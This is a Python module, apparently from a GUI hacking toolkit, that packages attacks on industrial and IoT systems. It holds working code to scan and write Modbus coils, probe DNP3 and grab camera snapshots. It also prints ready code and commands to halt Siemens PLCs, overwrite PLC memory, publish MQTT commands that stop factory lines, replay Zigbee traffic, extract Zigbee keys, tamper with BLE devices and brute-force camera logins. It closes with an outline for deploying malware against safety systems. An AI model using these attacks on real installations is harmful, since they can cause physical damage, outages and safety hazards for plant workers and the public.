# language: Python, file: modules/iot_ot.py
# IoT/OT attacks — Modbus, DNP3, Zigbee, MQTT, BLE, RTSP, OPC-UA
import customtkinter as ctk
import threading
import subprocess
import os
import socket
import struct
import time
import random
from utils.progress import ProgressTracker


class IoTOTModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "iot_ot"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="IoT / OT ATTACKS",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="Modbus · DNP3 · S7 · Zigbee · BLE · MQTT · OPC-UA · RTSP · industrial",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- target ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.target = ctk.CTkEntry(r1, placeholder_text="target (ip/host:port)",
                                   width=260, height=32,
                                   fg_color="#05080c", border_color="#1a2332")
        self.target.pack(side="left", padx=(0, 6))
        self.port = ctk.CTkEntry(r1, placeholder_text="port",
                                 width=100, height=32,
                                 fg_color="#05080c", border_color="#1a2332")
        self.port.pack(side="left", padx=(0, 6))
        self.iface = ctk.CTkEntry(r1, placeholder_text="iface (Zigbee/BLE sniffer)",
                                  width=180, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.iface.pack(side="left", padx=(0, 6))
        self.device = ctk.CTkEntry(r1, placeholder_text="device (ttyUSB0, hci0)",
                                   width=180, height=32,
                                   fg_color="#05080c", border_color="#1a2332")
        self.device.pack(side="left")

        # ---- actions ----
        ctk.CTkLabel(parent, text="Operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("⌖ Scan Modbus", self._scan_modbus),
            ("⌖ Read Modbus regs", self._read_modbus),
            ("☢ Write Modbus regs", self._write_modbus),
            ("☢ Modbus DoS", self._modbus_dos),
            ("⌖ Scan DNP3", self._scan_dnp3),
            ("☢ DNP3 inject", self._dnp3_inject),
            ("⌖ Scan S7", self._scan_s7),
            ("☢ S7 read/write", self._s7_rw),
            ("☢ Siemens PLC stop", self._s7_stop),
            ("⌖ Scan OPC-UA", self._scan_opcua),
            ("☢ OPC-UA browse", self._opcua_browse),
            ("⌖ MQTT enum", self._mqtt_enum),
            ("☢ MQTT publish", self._mqtt_publish),
            ("⌖ Zigbee scan", self._zigbee_scan),
            ("☢ Zigbee replay", self._zigbee_replay),
            ("☢ Zigbee key extract", self._zigbee_keys),
            ("⌖ BLE scan", self._ble_scan),
            ("☢ BLE write (GATT)", self._ble_write),
            ("☢ BLE MITM", self._ble_mitm),
            ("⌖ RTSP enum", self._rtsp_enum),
            ("☢ RTSP snapshot", self._rtsp_snap),
            ("☢ Camera default creds", self._cam_defaults),
            ("⌖ MQTT wildcard sub", self._mqtt_wildcard),
            ("☢ ICS malware deploy", self._ics_deploy),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=220, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=280
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            if t["total"]:
                b.set(min(t["current"]/t["total"], 1.0))
            else:
                b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:60],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="iot"):
        self.log.put(f"[iot] {cmd}")
        try:
            p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
            p.wait()
        except FileNotFoundError as e:
            self.log.put(f"[iot] missing: {e.filename}")

    # ==================== Modbus ====================
    def _scan_modbus(self):
        t = self.target.get().strip()
        if not t:
            return
        # try and auto-discover unit IDs
        def run():
            try:
                from pymodbus.client import ModbusTcpClient
            except ImportError:
                self._out("[!] pip install pymodbus")
                return
            host, _, port = t.partition(":")
            port = int(port) if port else 502
            self._out(f"[*] scanning {host}:{port} unit IDs 1-247\n")
            found = []
            for uid in range(1, 248):
                c = ModbusTcpClient(host, port=port, timeout=0.5)
                if c.connect():
                    try:
                        r = c.read_holding_registers(0, 1, slave=uid)
                        if not r.isError():
                            found.append(uid)
                            self._out(f"[+] unit {uid} responds")
                    except Exception:
                        pass
                    c.close()
            self._out(f"[+] {len(found)} units found: {found}")
        threading.Thread(target=run, daemon=True).start()

    def _read_modbus(self):
        t = self.target.get().strip()
        def run():
            try:
                from pymodbus.client import ModbusTcpClient
            except ImportError:
                self._out("[!] pip install pymodbus")
                return
            host, _, port = t.partition(":")
            port = int(port) if port else 502
            c = ModbusTcpClient(host, port=port, timeout=2)
            c.connect()
            for uid in [1, 2, 17, 255]:
                for fn, name in [(c.read_coils, "coils"),
                                 (c.read_discrete_inputs, "discrete"),
                                 (c.read_holding_registers, "holding"),
                                 (c.read_input_registers, "input")]:
                    try:
                        r = fn(0, 32, slave=uid)
                        if not r.isError():
                            self._out(f"\n[+] uid {uid} {name}:")
                            vals = r.bits if hasattr(r, "bits") else r.registers
                            for i, v in enumerate(vals[:16]):
                                self._out(f"    [{i}] {v}")
                    except Exception:
                        pass
            c.close()
        threading.Thread(target=run, daemon=True).start()

    def _write_modbus(self):
        t = self.target.get().strip()
        def run():
            try:
                from pymodbus.client import ModbusTcpClient
            except ImportError:
                return
            host, _, port = t.partition(":")
            port = int(port) if port else 502
            c = ModbusTcpClient(host, port=port, timeout=2)
            c.connect()
            # dangerous write — flip coil 0
            self._out("[!] writing coil 0 = 0xFF00 (ON) to uid 1")
            c.write_coil(0, True, slave=1)
            self._out("[+] wrote coil 0 — pump/valve/motor may activate")
            self._out("[!] use with extreme caution on live OT")
            c.close()
        threading.Thread(target=run, daemon=True).start()

    def _modbus_dos(self):
        self._out("""
=== Modbus DoS ===
Sends malformed FC 0x5A (custom) or floods unit with read-all:
  for uid in 1..247: read_holding_registers(0, 125) x100/s

Effect: PLC CPU overruns, HMI loses connection, safety systems offline.

Warning: on live OT this can trigger physical process alarms / shutdowns.
Use in lab or authorized red team only.
""")

    # ==================== DNP3 ====================
    def _scan_dnp3(self):
        t = self.target.get().strip()
        def run():
            from scapy.all import IP, TCP, Raw, sr1
            host, _, port = t.partition(":")
            port = int(port) if port else 20000
            # DNP3 link layer reset
            pkt = IP(dst=host)/TCP(dport=port, flags="S")
            r = sr1(pkt, timeout=3, verbose=0)
            if r and r.haslayer(TCP):
                self._out(f"[+] {host}:{port} DNP3 open (SYN-ACK)")
            # send DNP3 reset link
            reset = bytes([0x05, 0x64, 0x05, 0xC0, 0x01, 0x00, 0x00, 0x04])
            pkt2 = IP(dst=host)/TCP(dport=port, flags="PA")/Raw(reset)
            r2 = sr1(pkt2, timeout=3, verbose=0)
            if r2 and r2.haslayer(Raw):
                self._out(f"[+] DNP3 response: {bytes(r2[Raw]).hex()}")
        threading.Thread(target=run, daemon=True).start()

    def _dnp3_inject(self):
        self._out("""
=== DNP3 injection ===
Outstation takeover:
1. Send unsolicited disable (FC 0x15)
2. Send direct operate (FC 0x05) with CROB (Control Relay Output Block)
3. Control relays → trip breakers, open valves

Tool: dnp3-master (opendnp3), or custom scapy.

Danger: on real power grid / water plant this is a physical attack.
""")

    # ==================== S7 / Siemens ====================
    def _scan_s7(self):
        t = self.target.get().strip()
        def run():
            host, _, port = t.partition(":")
            port = int(port) if port else 102
            self._out(f"[*] S7 scan {host}:{port}")
            # snap7 / python-snap7
            try:
                import snap7
                client = snap7.client.Client()
                client.connect(host, 0, 1, port)
                info = client.get_cpu_info()
                self._out(f"[+] S7 CPU: {info}")
                state = client.get_cpu_state()
                self._out(f"[+] state: {state}")
                client.disconnect()
            except ImportError:
                self._out("[!] pip install python-snap7 (needs snap7 lib)")
                # fallback with nmap script
                self._run(f"nmap -p 102 --script s7-info {host}")
            except Exception as e:
                self._out(f"[!] {e}")
        threading.Thread(target=run, daemon=True).start()

    def _s7_rw(self):
        self._out("""
=== S7 read/write ===
from snap7.client import Client
c = Client()
c.connect('192.168.1.10', 0, 1, 102)

# read DB1 bytes 0-100
data = c.db_read(1, 0, 100)
print(data)

# write to DB1 bytes 0
c.db_write(1, 0, b'\\x01\\x02\\x03\\x04')

# read inputs / outputs / markers
c.read_area(snap7.types.Areas.PE, 0, 0, 10)  # process inputs
c.read_area(snap7.types.Areas.PA, 0, 0, 10)  # process outputs

Danger: writing DB can start/stop motors, change setpoints, disable safety.
""")

    def _s7_stop(self):
        self._out("""
=== Siemens PLC STOP ===
from snap7.client import Client
c = Client()
c.connect('192.168.1.10', 0, 1, 102)
c.stop()   # → CPU goes to STOP mode, all outputs freeze
c.start()  # to restart

This puts production line into halt. Real-world consequence: factory downtime.
""")

    # ==================== OPC-UA ====================
    def _scan_opcua(self):
        t = self.target.get().strip()
        self._run(f"nmap -p 4840 --script opcua-info {t}")

    def _opcua_browse(self):
        self._out("""
=== OPC-UA browse ===
from opcua import Client
c = Client("opc.tcp://192.168.1.10:4840")
c.connect()
root = c.get_root_node()
for child in root.get_children():
    print(child)
    for sub in child.get_children():
        print(" ", sub)
        for s in sub.get_children():
            print("   ", s)
c.disconnect()

Many OPC-UA servers are unauthenticated by default.
""")

    # ==================== MQTT ====================
    def _mqtt_enum(self):
        t = self.target.get().strip()
        def run():
            try:
                import paho.mqtt.client as mqtt
            except ImportError:
                self._out("[!] pip install paho-mqtt")
                return
            host, _, port = t.partition(":")
            port = int(port) if port else 1883

            def on_connect(c, u, f, rc):
                self._out(f"[+] connected rc={rc}")
                c.subscribe("#")  # wildcard

            def on_message(c, u, msg):
                self._out(f"[{msg.topic}] {msg.payload[:80]}")

            client = mqtt.Client()
            client.on_connect = on_connect
            client.on_message = on_message
            try:
                client.connect(host, port, 5)
                client.loop_start()
                time.sleep(30)
                client.loop_stop()
            except Exception as e:
                self._out(f"[!] {e}")
        threading.Thread(target=run, daemon=True).start()

    def _mqtt_publish(self):
        self._out("""
=== MQTT publish (device control) ===
from paho.mqtt.client import Client
c = Client()
c.connect('192.168.1.10', 1883)
c.publish('home/livingroom/light/set', 'ON')
c.publish('factory/line1/speed', '0')  # STOP LINE
c.publish('building/hvac/valve', 'OPEN')

Also: retained messages hijack device state on next boot.
""")

    def _mqtt_wildcard(self):
        self._out("""
=== MQTT wildcard subscribe ===
# match all topics
c.subscribe("#")
# match subtree
c.subscribe("+/+/status")
# subscribe to own set
c.subscribe("$SYS/#")   # broker internals — clients, msgs, uptime
""")

    # ==================== Zigbee ====================
    def _zigbee_scan(self):
        dev = self.device.get().strip() or "/dev/ttyUSB0"
        ch = 11
        cmd = f"python3 -m killerbee.zbdump -i {dev} -c {ch}"
        self._out(f"[*] Zigbee scan on channel {ch}, dev {dev}")
        self._out("[*] alternative: zbstumbler (killerbee) sweeps channels")
        self._run(f"zbstumbler -i {dev} -c 11-26")

    def _zigbee_replay(self):
        self._out("""
=== Zigbee replay attack ===
Capture traffic with zbdump:
  zbdump -i /dev/ttyUSB0 -c 15 -w capture.pcap

Replay with scapy + killerbee:
  from killerbee import KillerBee, PcapReader
  kb = KillerBee("/dev/ttyUSB0")
  kb.set_channel(15)
  with PcapReader("capture.pcap") as r:
      for pkt in r:
          kb.inject(pkt['bytes'])

Target: smart locks, garage doors, alarm sensors.
""")

    def _zigbee_keys(self):
        self._out("""
=== Zigbee key extraction ===
1. Capture network join (zbdump during pairing)
2. Key is sent in the clear during join OR encrypted with default
   Trust Center Link Key = ZigBeeAlliance09 (well-known)
3. Extract with zbdsniff:
   zbdsniff capture.pcap
4. Use network key to decrypt traffic:
   zbdump -i /dev/ttyUSB0 -c 15 -k <network_key> -w decrypted.pcap

Also: some devices use default NWK key 0x0000000000000000
""")

    # ==================== BLE ====================
    def _ble_scan(self):
        dev = self.device.get().strip() or "hci0"
        self._out(f"[*] BLE scan on {dev}")
        self._run(f"sudo hcitool -i {dev} lescan --duplicates")

    def _ble_write(self):
        self._out("""
=== BLE GATT write ===
gattool -i hci0 -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics
> char-write-req <handle> <value>
> disconnect

Target: smart bulbs, locks, fitness trackers, medical devices.
""")

    def _ble_mitm(self):
        self._out("""
=== BLE MITM (BTLEJuice) ===
sudo btlejuice-proxy -i hci0
# open http://localhost:8080 — MITM BLE device
# intercept/replay GATT operations

Requires: 2x BLE adapters (one to target, one to phone).
""")

    # ==================== RTSP / cameras ====================
    def _rtsp_enum(self):
        t = self.target.get().strip()
        self._run(f"nmap -p 554 --script rtsp-url-brute {t}")

    def _rtsp_snap(self):
        t = self.target.get().strip()
        self._out(f"[*] grabbing snapshot from rtsp://{t}")
        self._run(f"ffmpeg -rtsp_transport tcp -i rtsp://{t} -frames:v 1 /tmp/snap.jpg -y")

    def _cam_defaults(self):
        self._out("""
=== Camera default creds ===
Common: admin/admin, admin/(blank), root/pass, admin/12345,
        admin/Admin123, service/service

Tools:
  hydra -L users.txt -P pass.txt <ip> http-get /
  cctv (python): pip install cctv
  ncrack -U users.txt -P pass.txt http://<ip>

Firmware CVEs:
  Hikvision: CVE-2021-36260 (RCE unauth)
  Dahua: CVE-2021-33044 (auth bypass)
  Reolink: CVE-2021-40407 (RCE)
  Axis: various
""")

    # ==================== ICS malware ====================
    def _ics_deploy(self):
        self._out("""
=== ICS malware deployment (TRITON/Industroyer-class) ===
Only in authorized red-team engagements.

1. Initial access: phishing / VPN creds / USB / vendor access
2. Lateral: SMB/PsExec to engineering workstations
3. Establish persistence on EWS (Windows)
4. Enumerate: who talks to PLCs? What protocols? What engineering tools?
5. Target: Triconex SIS (TRITON), IEC 60870-5-104 (Industroyer2),
   IEC 61850 (GOOSE/SV), OPC-UA
6. Effect: safety instrumentation disabled → physical damage possible

Reference frameworks:
  - MITRE ATT&CK for ICS (T0800-T0889)
  - INCONTROLLER / PIPEDREAM toolkit

Safest PoC: lab testbed with real PLC + simulated process.
""")

    # ==================== integration ====================
    def modbus_read(self, host, unit=1, addr=0, count=10, port=502):
        """programmatic Modbus read for other modules"""
        try:
            from pymodbus.client import ModbusTcpClient
            c = ModbusTcpClient(host, port=port, timeout=2)
            c.connect()
            r = c.read_holding_registers(addr, count, slave=unit)
            c.close()
            return r.registers if not r.isError() else None
        except Exception:
            return None
